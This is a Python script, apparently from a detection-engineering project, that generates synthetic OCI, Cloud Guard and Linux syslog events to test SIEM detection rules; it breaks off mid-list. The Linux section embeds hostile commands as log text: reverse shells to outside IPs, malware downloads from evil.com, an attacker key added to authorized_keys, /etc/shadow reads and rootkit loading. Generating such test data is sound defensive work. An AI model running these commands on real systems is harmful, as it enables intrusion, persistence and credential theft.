"""
Generate realistic test log files for all 201 detection rules + 15 hunting queries.

Produces NDJSON (JSON Lines) files in test_data/ for each log source category:
  - oci_audit.jsonl          OCI Audit events (80 rules + hunting)
  - cloud_guard.jsonl        OCI Cloud Guard events (12 rules)
  - linux_syslog.jsonl       Linux syslog/auth events (65 rules + hunting)
  - windows_sysmon.jsonl     Windows Sysmon events (55 rules + hunting)
  - manifest.json            Maps rules to generated events

Each log entry is crafted to trigger detection rules when queried.
Hunting-specific events generate higher volumes with consistent source
attributes (same IP, same host) to support aggregation-based queries.

Usage:
  python3 scripts/generate_test_logs.py
  python3 scripts/generate_test_logs.py --validate
"""

import json
import ntpath
import os
import random
import re
import sys
import uuid
import argparse
from datetime import datetime, timedelta, timezone
from pathlib import Path

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from oci_config import COMPARTMENT_ID
from test_data_manifest import rebuild_manifest

PROJECT_DIR = Path(__file__).parent.parent
OUTPUT_DIR = PROJECT_DIR / 'test_data'
QUERIES_DIR = PROJECT_DIR / 'queries'

# ─── Identity pools ──────────────────────────────────────────────

OCI_USERS = [
    ("ocid1.user.oc1..aaa1", "admin@corp.example.com", "natv"),
    ("ocid1.user.oc1..aaa2", "sre-lead@corp.example.com", "natv"),
    ("ocid1.user.oc1..aaa3", "dev-ops@corp.example.com", "federation"),
    ("ocid1.user.oc1..aaa4", "rogue-admin@corp.example.com", "natv"),
    ("ocid1.user.oc1..aaa5", "compromised-svc@corp.example.com", "natv"),
]

SUSPICIOUS_IPS = ["45.33.32.156", "185.220.101.1", "91.92.109.18", "194.5.249.7"]
CORPORATE_IPS = ["10.0.0.5", "10.0.1.10", "172.16.0.50", "192.168.1.100"]

LINUX_HOSTS = ["web-prod-01", "app-prod-02", "db-prod-01", "bastion-01", "k8s-worker-03"]
LINUX_USERS = ["root", "admin", "deploy", "www-data", "svc-app"]
WINDOWS_HOSTS = ["DC01.corp.local", "SRV01.corp.local", "WS01.corp.local"]
WINDOWS_USERS = ["CORP\\admin", "CORP\\analyst", "NT AUTHORITY\\SYSTEM"]

BASE_TIME = datetime.now(timezone.utc) - timedelta(hours=24)
ISO_UTC_RE = re.compile(r"^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(?:\.\d+)?Z$")


def ts(offset_minutes=0):
    """Generate ISO8601 timestamp with optional offset."""
    t = BASE_TIME + timedelta(minutes=offset_minutes, seconds=random.randint(0, 59))
    return t.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"


def windows_guid():
    """Generate a Windows-style GUID string with braces."""
    return "{" + str(uuid.uuid4()).upper() + "}"


def shift_iso8601_utc(value, delta):
    """Shift a ``...Z`` UTC timestamp string by ``delta`` if it matches ISO8601."""
    if not isinstance(value, str) or not ISO_UTC_RE.match(value):
        return value

    shifted = datetime.fromisoformat(value.replace("Z", "+00:00")) + delta
    return shifted.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"


def shift_event_window(payload, delta):
    """Recursively shift UTC timestamp strings in a JSON-like payload."""
    if isinstance(payload, dict):
        return {key: shift_event_window(value, delta) for key, value in payload.items()}
    if isinstance(payload, list):
        return [shift_event_window(item, delta) for item in payload]
    return shift_iso8601_utc(payload, delta)


def expand_events_over_days(events, days):
    """Replicate a scenario set across trailing daily windows ending on the base day."""
    if days <= 1:
        return list(events)

    expanded = []
    for day in range(days - 1, -1, -1):
        delta = timedelta(days=-day)
        for event in events:
            expanded.append(shift_event_window(event, delta))
    return expanded


# ═══════════════════════════════════════════════════════════════════
#  OCI Audit Event Generators
# ═══════════════════════════════════════════════════════════════════

def oci_audit_event(event_type, user=None, ip=None, status="200",
                    response_payload=None, resource_name="", offset=0):
    """Generate a standard OCI Audit log event using the canonical schema builder.

    Delegates to ``schemas.build_oci_audit_event`` which produces the real
    OCI Audit CloudEvents v0.1 envelope (verified against ``oci audit event
    list`` on 2026-04-24) plus parallel OCI Log Analytics display-name
    columns. The Oracle ingest envelope (``oracle.ingestedtime`` etc.) is
    layered on top so legacy detections that key on those fields still match.
    """
    from schemas import build_oci_audit_event

    if user is None:
        user = random.choice(OCI_USERS)
    else:
        user = ("ocid1.user.oc1..aaa9", user, "natv")
    if ip is None:
        ip = random.choice(CORPORATE_IPS)

    event = build_oci_audit_event(
        event_type,
        event_time=ts(offset),
        principal_id=user[0],
        principal_name=user[1],
        auth_type=user[2],
        ip_address=ip,
        compartment_id=COMPARTMENT_ID,
        compartment_name="security-test",
        tenant_id="ocid1.tenancy.oc1..example",
        resource_name=resource_name,
        resource_id=f"ocid1.resource.oc1..{uuid.uuid4().hex[:40]}",
        user_agent="Oracle-JavaSDK/2.0 (test-simulation)",
        response_status=status,
        response_payload=response_payload,
    )
    # Preserve the legacy Oracle ingest envelope so existing OCI LA parsers
    # that key on ``oracle.compartmentid``/``oracle.ingestedtime`` keep working.
    event["oracle"] = {
        "compartmentid": COMPARTMENT_ID,
        "ingestedtime": ts(offset),
        "tenantid": "ocid1.tenancy.oc1..example",
    }
    # OCI LA OCI Audit native parser exposes the parsed Status field as the
    # raw HTTP status by default ("200", "404"), but several detection queries
    # expect the operator-friendly form ("Success" / "Failure"). Override the
    # ``Status`` parallel column so both forms are queryable.
    if str(status).startswith("2"):
        event["Status"] = "Success"
    elif str(status).startswith(("4", "5")):
        event["Status"] = "Failure"
    return event


def generate_oci_audit_events():
    """Generate OCI Audit events covering all 44 OCI Audit detection rules."""
    events = []

    # ── IAM Events ──
    iam_events = [
        ("com.oraclecloud.identitycontrolplane.createpolicy", "IAM Policy Created"),
        ("com.oraclecloud.identitycontrolplane.updatepolicy", "IAM Policy Updated"),
        ("com.oraclecloud.identitycontrolplane.deletepolicy", "IAM Policy Deleted"),
        ("com.oraclecloud.identitycontrolplane.createuser", "User Created"),
        ("com.oraclecloud.identitycontrolplane.deleteuser", "User Deleted"),
        ("com.oraclecloud.identitycontrolplane.addusertogroup", "User Added to Group"),
        ("com.oraclecloud.identitycontrolplane.removeuserfromgroup", "User Removed from Group"),
        ("com.oraclecloud.identitycontrolplane.creategroup", "Group Created"),
        ("com.oraclecloud.identitycontrolplane.deletegroup", "Group Deleted"),
        ("com.oraclecloud.identitycontrolplane.uploadapikey", "API Key Uploaded"),
    ]
    for i, (evt, name) in enumerate(iam_events):
        for j in range(3):
            events.append(oci_audit_event(evt, resource_name=name, offset=i*3+j))

    # ── Network Events ──
    network_events = [
        ("com.oraclecloud.virtualnetwork.createvcn", "VCN Created"),
        ("com.oraclecloud.virtualnetwork.deletevcn", "VCN Deleted"),
        ("com.oraclecloud.virtualnetwork.createsubnet", "Subnet Created"),
        ("com.oraclecloud.virtualnetwork.deletesubnet", "Subnet Deleted"),
        ("com.oraclecloud.virtualnetwork.createsecuritylist", "Security List Created"),
        ("com.oraclecloud.virtualnetwork.updatesecuritylist", "Security List Updated"),
        ("com.oraclecloud.virtualnetwork.createinternetgateway", "Internet GW Created"),
        ("com.oraclecloud.virtualnetwork.deleteinternetgateway", "Internet GW Deleted"),
        ("com.oraclecloud.virtualnetwork.attachinternetgateway", "Internet GW Attached"),
        ("com.oraclecloud.virtualnetwork.detachinternetgateway", "Internet GW Detached"),
        ("com.oraclecloud.virtualnetwork.createroutetable", "Route Table Created"),
        ("com.oraclecloud.virtualnetwork.updateroutetable", "Route Table Updated"),
        ("com.oraclecloud.virtualnetwork.updatenetworksecuritygroup", "NSG Updated"),
    ]
    base = len(events)
    for i, (evt, name) in enumerate(network_events):
        for j in range(2):
            events.append(oci_audit_event(evt, resource_name=name, offset=base+i*2+j))

    # Security list open to world
    for i in range(3):
        e = oci_audit_event(
            "com.oraclecloud.virtualnetwork.updatesecuritylist",
            resource_name="open-security-list",
            offset=base+len(network_events)*2+i
        )
        e["data"]["response"]["payload"] = {
            "ingressSecurityRules": [{"source": "0.0.0.0/0", "protocol": "6"}]
        }
        events.append(e)

    # ── Compute Events ──
    for i in range(3):
        events.append(oci_audit_event(
            "com.oraclecloud.computeapi.launchinstance",
            resource_name="compute-instance",
            offset=200+i
        ))
    for i in range(3):
        events.append(oci_audit_event(
            "com.oraclecloud.computeapi.terminateinstance",
            resource_name="terminated-instance",
            offset=210+i
        ))
    for i in range(2):
        events.append(oci_audit_event(
            "com.oraclecloud.computeapi.instanceaction.start",
            resource_name="started-instance",
            offset=220+i
        ))
    for i in range(2):
        events.append(oci_audit_event(
            "com.oraclecloud.computeapi.instanceaction.stop",
            resource_name="stopped-instance",
            offset=225+i
        ))

    # ── Storage Events ──
    for i in range(3):
        events.append(oci_audit_event(
            "com.oraclecloud.objectstorage.createbucket",
            resource_name="new-bucket",
            offset=300+i
        ))
    for i in range(2):
        events.append(oci_audit_event(
            "com.oraclecloud.objectstorage.deletebucket",
            resource_name="deleted-bucket",
            offset=310+i
        ))

    # Bucket made public
    for i in range(3):
        e = oci_audit_event(
            "com.oraclecloud.objectstorage.updatebucket",
            resource_name="public-bucket",
            offset=320+i
        )
        e["data"]["response"]["payload"] = {
            "publicAccessType": "ObjectRead"
        }
        events.append(e)

    # ── KMS Events ──
    for i in range(3):
        events.append(oci_audit_event(
            "com.oraclecloud.kms.createkey",
            resource_name="encryption-key",
            offset=400+i
        ))
    for i in range(2):
        events.append(oci_audit_event(
            "com.oraclecloud.kms.deletekey",
            resource_name="deleted-key",
            offset=410+i
        ))
    # KMS Key Scheduled Deletion
    for i in range(3):
        events.append(oci_audit_event(
            "com.oraclecloud.kms.schedulekeydeletion",
            resource_name="master-encryption-key",
            ip=random.choice(SUSPICIOUS_IPS),
            offset=420+i
        ))

    # ── Database Events ──
    # Autonomous DB Terminated
    for i in range(3):
        events.append(oci_audit_event(
            "com.oraclecloud.databaseservice.deleteautonomousdatabase",
            resource_name="production-autonomous-db",
            offset=500+i
        ))

    # ── Load Balancer Events ──
    for i in range(3):
        events.append(oci_audit_event(
            "com.oraclecloud.loadbalancer.deleteloadbalancer",
            resource_name="prod-web-lb",
            offset=600+i
        ))
    for i in range(2):
        events.append(oci_audit_event(
            "com.oraclecloud.networkloadbalancer.deletenetworkloadbalancer",
            resource_name="prod-nlb",
            offset=610+i
        ))

    # ── WAF Events ──
    for i in range(3):
        events.append(oci_audit_event(
            "com.oraclecloud.waf.updatewebappfirewallpolicy",
            resource_name="prod-waf-policy",
            offset=700+i
        ))

    # ── Console Login Events ──
    # Successful logins from suspicious IPs feed both the "console login from
    # unusual IP" and "console login Success" detections. ``oci_audit_event``
    # tags Status="Success" automatically when the HTTP status starts with 2.
    for i in range(8):
        events.append(oci_audit_event(
            "com.oraclecloud.consolesignon.login",
            ip=random.choice(SUSPICIOUS_IPS),
            status="200",
            resource_name="console-session",
            offset=800+i
        ))
    # Login failures
    for i in range(5):
        events.append(oci_audit_event(
            "com.oraclecloud.consolesignon.login",
            ip=random.choice(SUSPICIOUS_IPS),
            status="Failure",
            resource_name="",
            offset=810+i
        ))

    # ── Admin Policy Created with 'manage all-resources' ──
    # The ``manage all-resources`` keyword is surfaced in three places so the
    # OCI LA truncation of ``Original Log Content`` (cuts at ~1024 chars
    # inside ``data.identity``) cannot hide it from the LIKE filter:
    #   - ``data.additionalDetails`` (very early in the envelope)
    #   - ``resourceName`` (top-level ``Resource Name`` parsed column)
    #   - ``response.payload.statements`` (the actual policy text)
    for i in range(3):
        events.append(oci_audit_event(
            "com.oraclecloud.identitycontrolplane.createpolicy",
            resource_name="admin-policy: manage all-resources in tenancy",
            response_payload={
                "statements": ["Allow group admins to manage all-resources in tenancy"]
            },
            offset=900+i,
        ))
    # Override additional_details with the manage-all keyword via the
    # canonical schema builder. We re-emit with explicit additionalDetails
    # so the LIKE on Original Log Content matches before truncation.
    from schemas import build_oci_audit_event
    for i in range(3):
        ev = build_oci_audit_event(
            "com.oraclecloud.identitycontrolplane.createpolicy",
            event_time=ts(903 + i),
            principal_id="ocid1.user.oc1..aaa1",
            principal_name="admin@corp.example.com",
            auth_type="natv",
            ip_address=random.choice(SUSPICIOUS_IPS),
            compartment_id=COMPARTMENT_ID,
            compartment_name="security-test",
            tenant_id="ocid1.tenancy.oc1..example",
            resource_name="admin-policy: manage all-resources in tenancy",
            user_agent="Oracle-JavaSDK/2.0 (test-simulation)",
            response_status="200",
            response_payload={
                "statements": ["Allow group admins to manage all-resources in tenancy"]
            },
            additional_details={
                "policyStatements": "manage all-resources in tenancy",
                "auditTag": "admin-policy-manage-all-resources",
            },
        )
        ev["Status"] = "Success"
        ev["oracle"] = {
            "compartmentid": COMPARTMENT_ID,
            "ingestedtime": ts(903 + i),
            "tenantid": "ocid1.tenancy.oc1..example",
        }
        events.append(ev)

    # ═══════════════════════════════════════════════════════════════
    #  NEW: STIG Compliance OCI Audit Events
    # ═══════════════════════════════════════════════════════════════

    # ── MFA Disabled ──
    for i in range(2):
        events.append(oci_audit_event(
            "com.oraclecloud.identitycontrolplane.deletemfatotpdevice",
            resource_name="user-mfa-device",
            ip=random.choice(SUSPICIOUS_IPS),
            offset=1000+i
        ))
    events.append(oci_audit_event(
        "com.oraclecloud.identitycontrolplane.deletemfatotpdevice",
        resource_name="mfa-totp-device",
        offset=1002
    ))

    # ── Identity Provider Created (Federation Attack) ──
    for i in range(2):
        events.append(oci_audit_event(
            "com.oraclecloud.identitycontrolplane.createidentityprovider",
            resource_name="evil-saml-idp",
            ip=random.choice(SUSPICIOUS_IPS),
            offset=1010+i
        ))
    events.append(oci_audit_event(
        "com.oraclecloud.identitycontrolplane.createsaml2identityprovider",
        resource_name="rogue-saml2-idp",
        offset=1012
    ))

    # ── Dynamic Group Created ──
    for i in range(3):
        events.append(oci_audit_event(
            "com.oraclecloud.identitycontrolplane.createdynamicgroup",
            resource_name=f"dynamic-group-{i}",
            offset=1020+i
        ))

    # ── Auth Token Created ──
    for i in range(3):
        events.append(oci_audit_event(
            "com.oraclecloud.identitycontrolplane.createauthtoken",
            resource_name="swift-auth-token",
            offset=1030+i
        ))

    # ── Compartment Deleted ──
    for i in range(2):
        events.append(oci_audit_event(
            "com.oraclecloud.identitycontrolplane.deletecompartment",
            resource_name="production-compartment",
            ip=random.choice(SUSPICIOUS_IPS),
            offset=1040+i
        ))

    # ── Cloud Shell Session ──
    for i in range(2):
        events.append(oci_audit_event(
            "com.oraclecloud.cloudshell.startenvironment",
            resource_name="cloud-shell-env",
            offset=1050+i
        ))
    events.append(oci_audit_event(
        "com.oraclecloud.cloudshell.createenvironment",
        resource_name="cloud-shell-env",
        offset=1052
    ))

    # ── Security List Allows All Protocols ──
    for i in range(2):
        e = oci_audit_event(
            "com.oraclecloud.virtualnetwork.updatesecuritylist",
            resource_name="wide-open-seclist",
            offset=1060+i
        )
        e["data"]["response"]["payload"] = {
            "ingressSecurityRules": [{"source": "0.0.0.0/0", "protocol": "all"}]
        }
        events.append(e)

    # ── Vault Key Version Update (rotation disabled) ──
    for i in range(2):
        events.append(oci_audit_event(
            "com.oraclecloud.kms.updatekeyversion",
            resource_name="master-key-v2",
            offset=1070+i
        ))

    # ── Function Invoked ──
    for i in range(3):
        events.append(oci_audit_event(
            "com.oraclecloud.functions.invokefunction",
            resource_name=f"data-exfil-function-{i}",
            offset=1080+i
        ))

    # ── Cross-Region Data Copy ──
    cross_region_events = [
        "com.oraclecloud.blockvolumes.copybootvolumeregion",
        "com.oraclecloud.blockvolumes.copyvolumeregion",
        "com.oraclecloud.objectstorage.copyobject",
        "com.oraclecloud.objectstorage.createreplicationpolicy",
    ]
    for i, evt in enumerate(cross_region_events):
        events.append(oci_audit_event(
            evt, resource_name="cross-region-target",
            ip=random.choice(SUSPICIOUS_IPS),
            offset=1090+i
        ))

    # ── Database System Terminated ──
    for i in range(2):
        events.append(oci_audit_event(
            "com.oraclecloud.databaseservice.terminatedbsystem",
            resource_name="prod-db-system",
            offset=1100+i
        ))
    events.append(oci_audit_event(
        "com.oraclecloud.databaseservice.deletedbhome",
        resource_name="db-home-prod",
        offset=1102
    ))

    # ── Audit Configuration Changed ──
    for i in range(2):
        events.append(oci_audit_event(
            "com.oraclecloud.audit.updateconfiguration",
            resource_name="audit-config",
            ip=random.choice(SUSPICIOUS_IPS),
            offset=1110+i
        ))

    # ── Network Firewall Policy Modified ──
    fw_events = [
        "com.oraclecloud.networkfirewall.updatenetworkfirewallpolicy",
        "com.oraclecloud.networkfirewall.deletenetworkfirewall",
        "com.oraclecloud.networkfirewall.updatenetworkfirewall",
    ]
    for i, evt in enumerate(fw_events):
        events.append(oci_audit_event(
            evt, resource_name="prod-network-firewall",
            offset=1120+i
        ))

    # ── VCN Peering Created ──
    peering_events = [
        "com.oraclecloud.virtualnetwork.createlocalpeeringgateway",
        "com.oraclecloud.virtualnetwork.createremotepeeringconnection",
        "com.oraclecloud.virtualnetwork.connectremotepeeringconnections",
    ]
    for i, evt in enumerate(peering_events):
        events.append(oci_audit_event(
            evt, resource_name="peering-connection",
            offset=1130+i
        ))

    # ── Pre-Authenticated Request Created ──
    for i in range(3):
        events.append(oci_audit_event(
            "com.oraclecloud.objectstorage.createpreauthenticatedrequest",
            resource_name="sensitive-data-bucket-par",
            ip=random.choice(SUSPICIOUS_IPS),
            offset=1140+i
        ))

    # ═══════════════════════════════════════════════════════════════
    #  NEW (Batch 2): Additional OCI Audit Events
    # ═══════════════════════════════════════════════════════════════

    # ── Vault Secret Deleted ──
    for i in range(2):
        events.append(oci_audit_event(
            "com.oraclecloud.vault.schedulesecretdeletion",
            resource_name="db-connection-secret",
            ip=random.choice(SUSPICIOUS_IPS),
            offset=1200+i
        ))
    events.append(oci_audit_event(
        "com.oraclecloud.vault.deletesecret",
        resource_name="api-key-secret",
        offset=1202
    ))

    # ── User Password Reset by Admin ──
    for i in range(2):
        events.append(oci_audit_event(
            "com.oraclecloud.identitycontrolplane.createorupdateuiconsolepassword",
            resource_name="target-user-password",
            ip=random.choice(SUSPICIOUS_IPS),
            offset=1210+i
        ))
    events.append(oci_audit_event(
        "com.oraclecloud.identitycontrolplane.resetuiconsolepassword",
        resource_name="reset-user-password",
        offset=1212
    ))

    # ── Bastion Session Created ──
    for i in range(3):
        events.append(oci_audit_event(
            "com.oraclecloud.bastion.createsession",
            resource_name=f"bastion-ssh-session-{i}",
            offset=1220+i
        ))

    # ── Instance Console Connection Created ──
    for i in range(2):
        events.append(oci_audit_event(
            "com.oraclecloud.computeapi.createinstanceconsoleconnection",
            resource_name="prod-instance-console",
            ip=random.choice(SUSPICIOUS_IPS),
            offset=1230+i
        ))

    # ── Notification Subscription Created ──
    for i in range(3):
        events.append(oci_audit_event(
            "com.oraclecloud.ons.createsubscription",
            resource_name=f"alert-subscription-{i}",
            offset=1240+i
        ))

    # ── Log Group Deleted ──
    events.append(oci_audit_event(
        "com.oraclecloud.loganalytics.deleteloganalyticsloggroup",
        resource_name="security-log-group",
        ip=random.choice(SUSPICIOUS_IPS),
        offset=1250
    ))
    events.append(oci_audit_event(
        "com.oraclecloud.logging.deleteloggroup",
        resource_name="audit-log-group",
        ip=random.choice(SUSPICIOUS_IPS),
        offset=1251
    ))

    # ── Customer Secret Key Created ──
    for i in range(3):
        events.append(oci_audit_event(
            "com.oraclecloud.identitycontrolplane.createcustomersecretkey",
            resource_name="s3-compat-key",
            ip=random.choice(SUSPICIOUS_IPS),
            offset=1260+i
        ))

    # ═══════════════════════════════════════════════════════════════
    #  NEW (Batch 4): MITRE Tactic Expansion - OCI Events
    # ═══════════════════════════════════════════════════════════════

    # ── Cloud Infrastructure Discovery (T1580) ──
    discovery_events = [
        "com.oraclecloud.computeapi.listinstances",
        "com.oraclecloud.virtualnetwork.listvcns",
        "com.oraclecloud.virtualnetwork.listsubnets",
        "com.oraclecloud.objectstorage.listbuckets",
        "com.oraclecloud.identitycontrolplane.listusers",
        "com.oraclecloud.identitycontrolplane.listgroups",
        "com.oraclecloud.identitycontrolplane.listpolicies",
        "com.oraclecloud.databaseservice.listautonomousdatabases",
    ]
    for i, evt in enumerate(discovery_events):
        events.append(oci_audit_event(
            evt,
            user="compromised-svc@corp.example.com",
            ip="45.33.32.156",
            resource_name=f"enum-{evt.split('.')[-1]}",
            offset=1400+i
        ))

    # ── Password Spraying (multiple failures across users) (T1110.003) ──
    spray_users = [
        "user1@corp.example.com",
        "user2@corp.example.com",
        "user3@corp.example.com",
        "user4@corp.example.com",
        "user5@corp.example.com",
    ]
    for i, user in enumerate(spray_users):
        events.append(oci_audit_event(
            "com.oraclecloud.consolesignon.login",
            user=user,
            ip="91.92.109.18",
            status="Failure",
            resource_name="",
            offset=1420+i
        ))

    # ═══════════════════════════════════════════════════════════════
    #  HUNTING: High-volume events for aggregation-based queries
    # ═══════════════════════════════════════════════════════════════

    # ── Console Login Brute Force (8 failures from same user) ──
    brute_user = ("ocid1.user.oc1..aaa_brute", "brute-force-target@corp.example.com", "natv")
    brute_ip = "91.92.109.18"
    for i in range(8):
        events.append(oci_audit_event(
            "com.oraclecloud.consolesignon.login",
            user="brute-force-target@corp.example.com",
            ip=brute_ip,
            status="Failure",
            resource_name="",
            offset=1300+i
        ))

    # ── Multi-User Same IP (3 different users from one IP) ──
    shared_ip = "185.220.101.1"
    multi_users = [
        "admin@corp.example.com",
        "sre-lead@corp.example.com",
        "dev-ops@corp.example.com",
    ]
    for i, user in enumerate(multi_users):
        events.append(oci_audit_event(
            "com.oraclecloud.consolesignon.login",
            user=user,
            ip=shared_ip,
            resource_name="",
            offset=1320+i
        ))

    # ── IAM Rapid Changes (12 IAM events from one user) ──
    rapid_user = "rogue-admin@corp.example.com"
    rapid_iam_events = [
        "com.oraclecloud.identitycontrolplane.createuser",
        "com.oraclecloud.identitycontrolplane.deleteuser",
        "com.oraclecloud.identitycontrolplane.creategroup",
        "com.oraclecloud.identitycontrolplane.deletegroup",
        "com.oraclecloud.identitycontrolplane.addusertogroup",
        "com.oraclecloud.identitycontrolplane.removeuserfromgroup",
        "com.oraclecloud.identitycontrolplane.createpolicy",
        "com.oraclecloud.identitycontrolplane.updatepolicy",
        "com.oraclecloud.identitycontrolplane.deletepolicy",
        "com.oraclecloud.identitycontrolplane.createdynamicgroup",
        "com.oraclecloud.identitycontrolplane.createauthtoken",
        "com.oraclecloud.identitycontrolplane.uploadapikey",
    ]
    for i, evt in enumerate(rapid_iam_events):
        events.append(oci_audit_event(
            evt,
            user=rapid_user,
            ip="194.5.249.7",
            resource_name=f"rapid-change-{i}",
            offset=1340+i
        ))

    # ── Resource Destruction Spike (8 delete/terminate from one user) ──
    destroy_events = [
        ("com.oraclecloud.computeapi.terminateinstance", "destroy-instance-1"),
        ("com.oraclecloud.computeapi.terminateinstance", "destroy-instance-2"),
        ("com.oraclecloud.objectstorage.deletebucket", "destroy-bucket-1"),
        ("com.oraclecloud.objectstorage.deletebucket", "destroy-bucket-2"),
        ("com.oraclecloud.identitycontrolplane.deleteuser", "destroy-user-1"),
        ("com.oraclecloud.identitycontrolplane.deletegroup", "destroy-group-1"),
        ("com.oraclecloud.kms.deletekey", "destroy-key-1"),
        ("com.oraclecloud.databaseservice.deleteautonomousdatabase", "destroy-db-1"),
    ]
    for i, (evt, name) in enumerate(destroy_events):
        events.append(oci_audit_event(
            evt,
            user="compromised-svc@corp.example.com",
            ip="45.33.32.156",
            resource_name=name,
            offset=1360+i
        ))

    return events


# ═══════════════════════════════════════════════════════════════════
#  Cloud Guard Event Generators
# ═══════════════════════════════════════════════════════════════════

def cloud_guard_event(problem_type, resource_type="Instance", severity="HIGH",
                      recommendation="Review and remediate", offset=0):
    """Generate a Cloud Guard ProblemSummary-style event."""
    risk_score_map = {
        "CRITICAL": random.randint(90, 99),
        "HIGH": random.randint(70, 89),
        "MEDIUM": random.randint(40, 69),
        "LOW": random.randint(1, 39),
    }
    problem_id = str(uuid.uuid4())
    resource_name = f"test-{resource_type.lower()}-{random.randint(1, 99)}"
    return {
        # ProblemSummary-style identifiers
        "id": problem_id,
        "problemId": problem_id,  # backward compatibility for existing SOC parser content
        "compartmentId": COMPARTMENT_ID,
        "compartmentName": "security-test",
        "problemName": problem_type,
        "resourceType": resource_type,
        "resourceId": f"ocid1.{resource_type.lower()}.oc1..{uuid.uuid4().hex[:32]}",
        "resourceName": resource_name,
        "riskLevel": severity,
        "riskScore": risk_score_map.get(severity.upper(), 50),
        "detectorId": "ACTIVITY_DETECTOR",
        "detectorRuleId": f"ocid1.cloudguarddetectorrecipe.oc1..{uuid.uuid4().hex[:32]}",
        "region": "us-phoenix-1",
        "timeFirstDetected": ts(offset),
        "timeLastDetected": ts(offset + 1),
        "lifecycleState": "ACTIVE",
        "lifecycleDetail": "OPEN",
        "labels": [problem_type, problem_type.replace("_", " ")],
        "recommendation": recommendation,
        "additionalDetails": {
            "recommendedAction": recommendation,
            "targetDetector": "Cloud Guard Detector",
        },
    }


def generate_cloud_guard_events():
    """Generate Cloud Guard events covering all 12 Cloud Guard rules."""
    events = []

    # Problem names must match the Sigma rule detection values exactly
    problems = [
        ("Bucket_Public_Read", "Bucket", "HIGH"),
        ("Bucket_Public_Write", "Bucket", "CRITICAL"),
        ("INSTANCE_PUBLIC_IP", "Instance", "HIGH"),
        ("Instance_Principals_Enabled", "Instance", "MEDIUM"),
        ("Policy_Too_Permissive", "Policy", "HIGH"),
        ("Group_Has_Too_Many_Admins", "Group", "HIGH"),
        ("IAM_User_API_Key_Old", "User", "MEDIUM"),
        ("IAM_User_Console_Password_Old", "User", "MEDIUM"),
        ("Audit_Log_Retention", "Tenancy", "MEDIUM"),
        ("VCN_Flow_Log_Disabled", "VCN", "MEDIUM"),
        ("VCN_Security_List_Port_SSH", "SecurityList", "HIGH"),
        ("VCN_Security_List_Port_RDP", "SecurityList", "HIGH"),
    ]

    for i, (problem, resource, severity) in enumerate(problems):
        for j in range(3):
            events.append(cloud_guard_event(problem, resource, severity, offset=i*5+j))

    return events


# ═══════════════════════════════════════════════════════════════════
#  Linux Syslog Event Generators
# ═══════════════════════════════════════════════════════════════════

def linux_event(process, message, host=None, facility="auth", offset=0):
    """Generate a Linux syslog event in JSON format."""
    if host is None:
        host = random.choice(LINUX_HOSTS)
    return {
        "Timestamp": ts(offset),
        "Hostname": host,
        "Process": process,
        "PID": random.randint(100, 65535),
        "Facility": facility,
        "Severity": "info",
        "msg": message,
    }


def generate_linux_events():
    """Generate Linux events covering all 33 Linux rules."""
    events = []

    # SSH Failed Login
    attacker_ip = random.choice(SUSPICIOUS_IPS)
    for i in range(10):
        events.append(linux_event("sshd",
            f"Failed password for {random.choice(LINUX_USERS)} from {attacker_ip} port {random.randint(40000,65535)} ssh2",
            offset=i))

    # Sudo usage
    for i in range(5):
        user = random.choice(["admin", "deploy", "www-data"])
        events.append(linux_event("sudo",
            f"{user} : TTY=pts/{i} ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash",
            offset=20+i, facility="auth"))

    # Reverse shell patterns
    shells = [
        "bash -i >& /dev/tcp/185.215.113.206/4444 0>&1",
        "nc -e /bin/sh 103.253.41.45 8080",
        "ncat -e /bin/bash 89.34.111.113 443",
        "mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 5.252.178.48 443 >/tmp/f",
        "python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\"185.215.113.206\",4444));'",
    ]
    for i, shell in enumerate(shells):
        events.append(linux_event("bash", shell, offset=30+i, facility="syslog"))

    # Crontab modification
    for i in range(3):
        events.append(linux_event("crontab",
            f"({random.choice(LINUX_USERS)}) REPLACE (root) crontab",
            offset=40+i, facility="cron"))

    # SSH authorized_keys modified
    for i in range(3):
        user = random.choice(LINUX_USERS)
        events.append(linux_event("bash",
            f"echo 'ssh-rsa AAAA... attacker@evil' >> /home/{user}/.ssh/authorized_keys",
            offset=50+i, facility="syslog"))

    # History file cleared
    history_cmds = [
        "history -c",
        "rm -f ~/.bash_history",
        "unset HISTFILE",
        "export HISTSIZE=0",
    ]
    for i, cmd in enumerate(history_cmds):
        events.append(linux_event("bash", cmd, offset=60+i, facility="syslog"))

    # Suspicious binaries (GTFOBins)
    suspicious_bins = {
        "base64": "base64 -d /tmp/encoded_payload",
        "chmod": "chmod 4755 /tmp/exploit",
        "chown": "chown root:root /tmp/backdoor",
        "curl": "curl -o /tmp/payload http://evil.com/malware",
        "dd": "dd if=/dev/sda of=/tmp/disk.img bs=4M",
        "gdb": "gdb -p 1234 -ex 'call system(\"/bin/sh\")'",
        "id": "id",
        "insmod": "insmod /tmp/rootkit.ko",
        "lua": "lua -e 'os.execute(\"/bin/sh\")'",
        "modprobe": "modprobe evil_module",
        "nc": "nc -lvp 4444 -e /bin/sh",
        "ncat": "ncat -lvp 4444 -e /bin/sh",
        "netcat": "netcat -e /bin/sh 10.0.0.1 4444",
        "nmap": "nmap -sV -p 1-65535 10.0.0.0/24",
        "passwd": "passwd --stdin deploy",
        "perl": "perl -e 'exec \"/bin/sh\"'",
        "python": "python -c 'import pty;pty.spawn(\"/bin/sh\")'",
        "rmmod": "rmmod evil_module",
        "ruby": "ruby -e 'exec \"/bin/sh\"'",
        "shadow": "cat /etc/shadow",
        "socat": "socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/sh",
        "strace": "strace -p 1 -e trace=open",
        "tcpdump": "tcpdump -i eth0 -w /tmp/capture.pcap",
        "tshark": "tshark -i eth0 -w /tmp/capture.pcap",
        "wget": "wget http://evil.com/malware -O /tmp/payload",
        "whoami": "whoami",
        "wireshark": "wireshark -i eth0 -k",
    }
    for i, (binary, cmd) in enumerate(suspicious_bins.items()):
        for j in range(2):
            events.append(linux_event(binary, cmd,
                offset=100+i*3+j, facility="syslog"))

    # ═══════════════════════════════════════════════════════════════
    #  NEW: Advanced Linux Attack Patterns
    # ═══════════════════════════════════════════════════════════════

    # ── Container Escape Attempts ──
    container_escapes = [
